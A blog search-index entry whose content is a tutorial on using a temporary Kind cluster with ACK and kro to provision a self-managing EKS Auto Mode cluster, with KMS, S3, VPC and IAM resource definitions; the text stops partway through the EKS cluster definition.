[ { "title": "Bootstrap EKS Auto Mode Cluster with ACK and kro using Kind", "url": "/posts/bootstrap-eks-auto-mode-bootstrap-ack-kro-velero/", "categories": "Kubernetes, Cloud", "tags": "ack, amazon-eks, eks-auto-mode, kind, kro, kubernetes, velero", "date": "2026-01-26 00:00:00 +0100", "content": "This post demonstrates how to use a temporary Kind cluster with AWS Controllers for Kubernetes (ACK) and Kubernetes Resource Orchestrator (kro) to bootstrap a EKS Auto Mode Cluster that manages itself. The process involves creating AWS resources including an S3 bucket and an EKS Auto Mode Cluster using native Kubernetes APIs, backing up those resources with Velero, and restoring them to the new EKS Auto Mode Cluster — effectively making it self-managed. Requirements AWS account with appropriate permissions AWS CLI kubectl Helm kind Velero CLI Architecture Overview The bootstrap process follows these steps: Deploy Kind cluster locally Install kro and ACK controllers on Kind cluster Use ACK + kro to provision EKS Auto Mode Cluster and S3 bucket Install Velero on Kind cluster and backup kro + ACK resources to S3 bucket Install kro, ACK controllers, and Velero on EKS Auto Mode Cluster Restore kro and ACK resources to EKS Auto Mode Cluster Delete Kind cluster - EKS Auto Mode Cluster now manages itself flowchart TD subgraph Local[\"Local Machine\"] A[1. Deploy Kind Cluster] end subgraph Kind[\"Kind Cluster\"] B[2. Install kro + ACK] C[3. Provision EKS Cluster + S3 Bucket] D[4. Install Velero + Backup Resources] end subgraph AWS[\"AWS Cloud\"] S3[(S3 Bucket)] subgraph EKS[\"EKS Auto Mode Cluster\"] E[5. Install kro + ACK + Velero] F[6. Restore Resources] end end A --&gt; B B --&gt; C C --&gt; S3 C --&gt; EKS D --&gt;|Backup| S3 E --&gt; F S3 --&gt;|Restore| F style Local fill:#326ce5,stroke:#fff,color:#fff style Kind fill:#326ce5,stroke:#fff,color:#fff style AWS fill:#ff9900,stroke:#fff,color:#fff style EKS fill:#ff9900,stroke:#fff,color:#fff ACK provides Kubernetes CRDs for AWS services, while kro orchestrates complex resource dependencies, creating a powerful infrastructure management platform. Prerequisites You will need to configure the AWS CLI and set up other necessary secrets and variables: # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"k02.k8s.mylabs.dev\" # Cluster Name: k02 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}\"/{\"${CLUSTER_FQDN}\",\"kind-${CLUSTER_NAME}-bootstrap\"} Bootstrap Kind Cluster and Provision EKS Auto Mode with ACK and kro This section covers creating a temporary Kind cluster, installing kro and ACK controllers, defining ResourceGraphDefinitions, and using them to provision the EKS Auto Mode Cluster along with all supporting AWS resources. Create Kind Cluster Create the Kind cluster: kind create cluster --name \"kind-${CLUSTER_NAME}-bootstrap\" --kubeconfig \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kubeconfig-kind-${CLUSTER_NAME}-bootstrap.yaml\" export KUBECONFIG=\"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kubeconfig-kind-${CLUSTER_NAME}-bootstrap.yaml\" Install kro on Kind Cluster Install kro using Helm: # renovate: datasource=docker depName=registry.k8s.io/kro/charts/kro KRO_HELM_CHART_VERSION=\"0.8.5\" helm upgrade --install --version=${KRO_HELM_CHART_VERSION} --namespace kro-system --create-namespace kro oci://registry.k8s.io/kro/charts/kro Install ACK Controllers on Kind Cluster Create namespace and configure AWS credentials for ACK: kubectl create namespace ack-system set +x kubectl -n ack-system create secret generic aws-credentials --from-literal=credentials=\"[default] aws_access_key_id=${AWS_ACCESS_KEY_ID} aws_secret_access_key=${AWS_SECRET_ACCESS_KEY} aws_session_token=${AWS_SESSION_TOKEN} aws_role_to_assume=${AWS_ROLE_TO_ASSUME}\" set -x Install ACK controllers (S3, IAM, EKS, EC2, KMS, CloudWatch Logs): # renovate: datasource=github-tags depName=aws-controllers-k8s/ack-chart ACK_HELM_CHART_VERSION=\"46.75.1\" cat &gt; \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/helm_values-ack.yml\" &lt;&lt; EOF eks: enabled: true aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials ec2: enabled: true aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials iam: enabled: true aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials kms: enabled: true aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials cloudwatchlogs: enabled: true aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials s3: enabled: true aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials EOF helm upgrade --install --version=${ACK_HELM_CHART_VERSION} --namespace ack-system --values \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/helm_values-ack.yml\" ack oci://public.ecr.aws/aws-controllers-k8s/ack-chart Create EKS Auto Mode Cluster with ACK and kro Create an EKS Auto Mode Cluster using kro ResourceGraphDefinitions. This approach uses ResourceGraphDefinitions for the EKS Auto Mode Cluster itself. Add KMS Key ResourceGraphDefinition Define a KMS key used for encrypting EKS Auto Mode Cluster and S3 data: tee \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kro-kmskey-rgd.yaml\" &lt;&lt; 'EOF' | kubectl apply -f - apiVersion: kro.run/v1alpha1 kind: ResourceGraphDefinition metadata: name: kmskey spec: schema: apiVersion: v1alpha1 kind: KmsKey spec: name: string accountId: string region: string | default=\"us-east-1\" status: keyARN: ${kmsKey.status.ackResourceMetadata.arn} keyID: ${kmsKey.status.keyID} resources: - id: kmsKey template: apiVersion: kms.services.k8s.aws/v1alpha1 kind: Key metadata: name: \"${schema.spec.name}-kms-key\" spec: description: \"KMS key for ${schema.spec.name} EKS Auto Mode Cluster\" enableKeyRotation: true policy: | { \"Version\": \"2012-10-17\", \"Id\": \"eks-key-policy-${schema.spec.name}\", \"Statement\": [ { \"Sid\": \"Allow full access to the account root\", \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"arn:aws:iam::${schema.spec.accountId}:root\" }, \"Action\": \"kms:*\", \"Resource\": \"*\" }, { \"Sid\": \"Allow AWS services to use the key\", \"Effect\": \"Allow\", \"Principal\": { \"Service\": [ \"eks.amazonaws.com\", \"logs.${schema.spec.region}.amazonaws.com\" ] }, \"Action\": [ \"kms:Encrypt\", \"kms:Decrypt\", \"kms:ReEncrypt*\", \"kms:GenerateDataKey*\", \"kms:CreateGrant\", \"kms:DescribeKey\" ], \"Resource\": \"*\", \"Condition\": { \"StringEquals\": { \"aws:SourceAccount\": \"${schema.spec.accountId}\" } } }, { \"Sid\": \"Allow S3 access for Velero and EKS Auto Mode Cluster node volumes\", \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": [ \"kms:Encrypt\", \"kms:Decrypt\", \"kms:ReEncrypt*\", \"kms:GenerateDataKey*\", \"kms:CreateGrant\", \"kms:DescribeKey\" ], \"Resource\": \"*\", \"Condition\": { \"StringEquals\": { \"kms:ViaService\": [ \"s3.${schema.spec.region}.amazonaws.com\", \"ec2.${schema.spec.region}.amazonaws.com\" ], \"kms:CallerAccount\": \"${schema.spec.accountId}\" } } } ] } - id: kmsKeyAlias template: apiVersion: kms.services.k8s.aws/v1alpha1 kind: Alias metadata: name: \"${schema.spec.name}-kms-alias\" spec: name: \"alias/${schema.spec.name}-eks-auto-mode-cluster\" targetKeyID: ${kmsKey.status.keyID} EOF Create S3 Bucket with ACK and kro First, create an RGD that defines how to create an S3 bucket with proper policies: tee \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kro-s3bucket-rgd.yaml\" &lt;&lt; 'EOF' | kubectl apply -f - apiVersion: kro.run/v1alpha1 kind: ResourceGraphDefinition metadata: name: s3-velero-bucket spec: schema: apiVersion: v1alpha1 kind: S3Bucket spec: bucketName: string region: string kmsKeyARN: string tags: owner: \"string | default=\\\"\\\"\" environment: \"string | default=\\\"dev\\\"\" cluster: \"string | default=\\\"\\\"\" status: bucketARN: ${s3bucket.status.ackResourceMetadata.arn} bucketName: ${s3bucket.status.ackResourceMetadata.arn} resources: - id: s3bucket template: apiVersion: s3.services.k8s.aws/v1alpha1 kind: Bucket metadata: name: ${schema.spec.bucketName} spec: name: ${schema.spec.bucketName} publicAccessBlock: blockPublicACLs: true blockPublicPolicy: true ignorePublicACLs: true restrictPublicBuckets: true encryption: rules: - applyServerSideEncryptionByDefault: sseAlgorithm: aws:kms kmsMasterKeyID: ${schema.spec.kmsKeyARN} tagging: tagSet: - key: \"Name\" value: \"${schema.spec.bucketName}\" - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" policy: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"ForceSSLOnlyAccess\", \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": \"s3:*\", \"Resource\": [ \"arn:aws:s3:::${schema.spec.bucketName}\", \"arn:aws:s3:::${schema.spec.bucketName}/*\" ], \"Condition\": { \"Bool\": { \"aws:SecureTransport\": \"false\" } } } ] } EOF Add CloudWatch LogGroup ResourceGraphDefinition Create a CloudWatch LogGroup for EKS Auto Mode Cluster logs: tee \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kro-ekscloudwatchloggroup-loggroup-rgd.yaml\" &lt;&lt; 'EOF' | kubectl apply -f - apiVersion: kro.run/v1alpha1 kind: ResourceGraphDefinition metadata: name: ekscloudwatchloggroup spec: schema: apiVersion: v1alpha1 kind: EksCloudWatchLogGroup spec: name: string retentionDays: \"integer | default=1\" kmsKeyARN: \"string | default=\\\"\\\"\" tags: owner: \"string | default=\\\"\\\"\" environment: \"string | default=\\\"dev\\\"\" cluster: \"string | default=\\\"\\\"\" status: logGroupName: ${cloudWatchLogGroup.spec.name} resources: - id: cloudWatchLogGroup template: apiVersion: cloudwatchlogs.services.k8s.aws/v1alpha1 kind: LogGroup metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-logs\" spec: name: \"/aws/eks/${schema.spec.name}/cluster\" retentionDays: ${schema.spec.retentionDays} kmsKeyID: ${schema.spec.kmsKeyARN} tags: Name: \"/aws/eks/${schema.spec.name}/cluster\" Owner: \"${schema.spec.tags.owner}\" Environment: \"${schema.spec.tags.environment}\" Cluster: \"${schema.spec.tags.cluster}\" EOF Add VPC ResourceGraphDefinition Create a VPC with networking resources for EKS Auto Mode Cluster: tee \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kro-eksvpc-rgd.yaml\" &lt;&lt; 'EOF' | kubectl apply -f - apiVersion: kro.run/v1alpha1 kind: ResourceGraphDefinition metadata: name: eksvpc spec: schema: apiVersion: v1alpha1 kind: EksVpc spec: name: string region: string | default=\"us-east-1\" tags: owner: \"string | default=\\\"\\\"\" environment: \"string | default=\\\"dev\\\"\" cluster: \"string | default=\\\"\\\"\" cidr: vpcCidr: \"string | default=\\\"192.168.0.0/16\\\"\" publicSubnet1Cidr: \"string | default=\\\"192.168.0.0/19\\\"\" publicSubnet2Cidr: \"string | default=\\\"192.168.32.0/19\\\"\" privateSubnet1Cidr: \"string | default=\\\"192.168.64.0/19\\\"\" privateSubnet2Cidr: \"string | default=\\\"192.168.96.0/19\\\"\" status: vpcID: ${vpc.status.vpcID} publicSubnet1ID: ${publicSubnet1.status.subnetID} publicSubnet2ID: ${publicSubnet2.status.subnetID} privateSubnet1ID: ${privateSubnet1.status.subnetID} privateSubnet2ID: ${privateSubnet2.status.subnetID} resources: - id: vpc readyWhen: - ${vpc.status.state == \"available\"} template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: VPC metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-vpc\" spec: cidrBlocks: - ${schema.spec.cidr.vpcCidr} enableDNSSupport: true enableDNSHostnames: true tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-vpc\" - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" - id: eip template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: ElasticIPAddress metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-eip\" spec: tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-eip\" - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" - id: internetGateway template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: InternetGateway metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-igw\" spec: vpc: ${vpc.status.vpcID} tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-igw\" - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" - id: natGateway readyWhen: - '${natGateway.status.state == \"available\"}' template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: NATGateway metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-nat-gateway\" spec: subnetID: ${publicSubnet1.status.subnetID} allocationID: ${eip.status.allocationID} tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-nat-gateway\" - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" - id: publicRoutetable template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: RouteTable metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-public-routetable\" spec: vpcID: ${vpc.status.vpcID} routes: - destinationCIDRBlock: 0.0.0.0/0 gatewayID: ${internetGateway.status.internetGatewayID} tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-public-routetable\" - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" - id: privateRoutetable template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: RouteTable metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-private-routetable\" spec: vpcID: ${vpc.status.vpcID} routes: - destinationCIDRBlock: 0.0.0.0/0 natGatewayID: ${natGateway.status.natGatewayID} tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-private-routetable\" - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" # Public Subnet 1 (us-east-1a) - id: publicSubnet1 readyWhen: - ${publicSubnet1.status.state == \"available\"} template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Subnet metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-public-subnet1-${schema.spec.region}a\" spec: availabilityZone: ${schema.spec.region}a cidrBlock: ${schema.spec.cidr.publicSubnet1Cidr} mapPublicIPOnLaunch: true vpcID: ${vpc.status.vpcID} routeTables: - ${publicRoutetable.status.routeTableID} tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-public-subnet1-${schema.spec.region}a\" - key: kubernetes.io/role/elb value: '1' - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" # Public Subnet 2 (us-east-1b) - id: publicSubnet2 readyWhen: - ${publicSubnet2.status.state == \"available\"} template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Subnet metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-public-subnet2-${schema.spec.region}b\" spec: availabilityZone: ${schema.spec.region}b cidrBlock: ${schema.spec.cidr.publicSubnet2Cidr} mapPublicIPOnLaunch: true vpcID: ${vpc.status.vpcID} routeTables: - ${publicRoutetable.status.routeTableID} tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-public-subnet2-${schema.spec.region}b\" - key: kubernetes.io/role/elb value: '1' - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" # Private Subnet 1 (us-east-1a) - id: privateSubnet1 readyWhen: - ${privateSubnet1.status.state == \"available\"} template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Subnet metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-private-subnet1-${schema.spec.region}a\" spec: availabilityZone: ${schema.spec.region}a cidrBlock: ${schema.spec.cidr.privateSubnet1Cidr} vpcID: ${vpc.status.vpcID} routeTables: - ${privateRoutetable.status.routeTableID} tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-private-subnet1-${schema.spec.region}a\" - key: kubernetes.io/role/internal-elb value: '1' - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" # Private Subnet 2 (us-east-1b) - id: privateSubnet2 readyWhen: - ${privateSubnet2.status.state == \"available\"} template: apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Subnet metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-private-subnet2-${schema.spec.region}b\" spec: availabilityZone: ${schema.spec.region}b cidrBlock: ${schema.spec.cidr.privateSubnet2Cidr} vpcID: ${vpc.status.vpcID} routeTables: - ${privateRoutetable.status.routeTableID} tags: - key: \"Name\" value: \"${schema.spec.name}-eks-auto-mode-cluster-private-subnet2-${schema.spec.region}b\" - key: kubernetes.io/role/internal-elb value: '1' - key: \"Owner\" value: \"${schema.spec.tags.owner}\" - key: \"Environment\" value: \"${schema.spec.tags.environment}\" - key: \"Cluster\" value: \"${schema.spec.tags.cluster}\" EOF Add Pod Identity Associations ResourceGraphDefinition Create a RGD for Pod Identity Associations that sets up Velero and ACK controller permissions: tee \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kro-podidentityassociations-rgd.yaml\" &lt;&lt; 'EOF' | kubectl apply -f - apiVersion: kro.run/v1alpha1 kind: ResourceGraphDefinition metadata: name: podidentityassociations spec: schema: apiVersion: v1alpha1 kind: PodIdentityAssociations spec: name: string clusterName: string accountId: string s3BucketName: string tags: owner: \"string | default=\\\"\\\"\" environment: \"string | default=\\\"dev\\\"\" cluster: \"string | default=\\\"\\\"\" resources: - id: veleroPolicy template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Policy metadata: name: ${schema.spec.name}-velero-policy spec: name: ${schema.spec.name}-velero-policy description: \"Velero S3 backup and snapshot permissions\" policyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"S3ObjectAccess\", \"Effect\": \"Allow\", \"Action\": [ \"s3:GetObject\", \"s3:DeleteObject\", \"s3:PutObject\", \"s3:AbortMultipartUpload\", \"s3:ListMultipartUploadParts\" ], \"Resource\": \"arn:aws:s3:::${schema.spec.s3BucketName}/*\" }, { \"Sid\": \"S3BucketAccess\", \"Effect\": \"Allow\", \"Action\": [ \"s3:ListBucket\" ], \"Resource\": \"arn:aws:s3:::${schema.spec.s3BucketName}\" } ] } tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: veleroRole template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-velero-velero\" spec: name: \"${schema.spec.name}-velero-velero\" assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"pods.eks.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } policies: - ${veleroPolicy.status.ackResourceMetadata.arn} tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: veleroPodIdentityAssociation template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: PodIdentityAssociation metadata: name: \"${schema.spec.name}-velero-velero\" spec: clusterName: ${schema.spec.clusterName} namespace: velero serviceAccount: velero-server roleARN: ${veleroRole.status.ackResourceMetadata.arn} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: ackCloudwatchlogsRole template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-ack-cloudwatchlogs-controller\" spec: name: \"${schema.spec.name}-ack-cloudwatchlogs-controller\" assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"pods.eks.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } policies: - \"arn:aws:iam::aws:policy/CloudWatchFullAccessV2\" tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: ackCloudwatchlogsPodIdentityAssociation template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: PodIdentityAssociation metadata: name: \"${schema.spec.name}-ack-system-ack-cloudwatchlogs-controller\" spec: clusterName: ${schema.spec.clusterName} namespace: ack-system serviceAccount: ack-cloudwatchlogs-controller roleARN: ${ackCloudwatchlogsRole.status.ackResourceMetadata.arn} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: ackEc2Role template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-ack-ec2-controller\" spec: name: \"${schema.spec.name}-ack-ec2-controller\" assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"pods.eks.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } policies: - \"arn:aws:iam::aws:policy/AmazonEC2FullAccess\" tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: ackEc2PodIdentityAssociation template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: PodIdentityAssociation metadata: name: \"${schema.spec.name}-ack-system-ack-ec2-controller\" spec: clusterName: ${schema.spec.clusterName} namespace: ack-system serviceAccount: ack-ec2-controller roleARN: ${ackEc2Role.status.ackResourceMetadata.arn} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: ackEksRole template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-ack-eks-controller\" spec: name: \"${schema.spec.name}-ack-eks-controller\" assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"pods.eks.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } inlinePolicies: eks-controller-policy: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"eks:*\", \"iam:GetRole\", \"iam:PassRole\", \"iam:ListAttachedRolePolicies\", \"ec2:DescribeSubnets\", \"kms:DescribeKey\", \"kms:CreateGrant\" ], \"Resource\": \"*\" } ] } tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: ackEksPodIdentityAssociation template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: PodIdentityAssociation metadata: name: \"${schema.spec.name}-ack-system-ack-eks-controller\" spec: clusterName: ${schema.spec.clusterName} namespace: ack-system serviceAccount: ack-eks-controller roleARN: ${ackEksRole.status.ackResourceMetadata.arn} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: ackIamRole template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-ack-iam-controller\" spec: name: \"${schema.spec.name}-ack-iam-controller\" assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"pods.eks.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } policies: - \"arn:aws:iam::aws:policy/IAMFullAccess\" tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: ackIamPodIdentityAssociation template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: PodIdentityAssociation metadata: name: \"${schema.spec.name}-ack-system-ack-iam-controller\" spec: clusterName: ${schema.spec.clusterName} namespace: ack-system serviceAccount: ack-iam-controller roleARN: ${ackIamRole.status.ackResourceMetadata.arn} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: ackKmsRole template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-ack-kms-controller\" spec: name: \"${schema.spec.name}-ack-kms-controller\" assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"pods.eks.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } inlinePolicies: kms-controller-policy: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": \"kms:*\", \"Resource\": \"*\" } ] } tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: ackKmsPodIdentityAssociation template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: PodIdentityAssociation metadata: name: \"${schema.spec.name}-ack-system-ack-kms-controller\" spec: clusterName: ${schema.spec.clusterName} namespace: ack-system serviceAccount: ack-kms-controller roleARN: ${ackKmsRole.status.ackResourceMetadata.arn} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: ackS3Role template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-ack-s3-controller\" spec: name: \"${schema.spec.name}-ack-s3-controller\" assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"pods.eks.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } policies: - \"arn:aws:iam::aws:policy/AmazonS3FullAccess\" tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: ackS3PodIdentityAssociation template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: PodIdentityAssociation metadata: name: \"${schema.spec.name}-ack-system-ack-s3-controller\" spec: clusterName: ${schema.spec.clusterName} namespace: ack-system serviceAccount: ack-s3-controller roleARN: ${ackS3Role.status.ackResourceMetadata.arn} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" EOF Add EKS Auto Mode Cluster ResourceGraphDefinition Create the EKS Auto Mode Cluster RGD: tee \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kro-eks-auto-mode-cluster-rgd.yaml\" &lt;&lt; 'EOF' | kubectl apply -f - apiVersion: kro.run/v1alpha1 kind: ResourceGraphDefinition metadata: name: eks-auto-mode-cluster spec: schema: apiVersion: v1alpha1 kind: EksAutoModeCluster spec: name: string region: string | default=\"us-east-1\" k8sVersion: \"string | default=\\\"\\\"\" accountId: string adminRoleARN: string tags: owner: \"string | default=\\\"\\\"\" environment: \"string | default=\\\"dev\\\"\" cluster: \"string | default=\\\"\\\"\" s3BucketName: string vpcConfig: endpointPrivateAccess: \"boolean | default=true\" endpointPublicAccess: \"boolean | default=true\" nodeGroupConfig: desiredSize: \"integer | default=2\" minSize: \"integer | default=1\" maxSize: \"integer | default=3\" instanceType: \"string | default=\\\"t4g.medium\\\"\" volumeSize: \"integer | default=20\" cidr: vpcCidr: \"string | default=\\\"192.168.0.0/16\\\"\" publicSubnet1Cidr: \"string | default=\\\"192.168.0.0/19\\\"\" 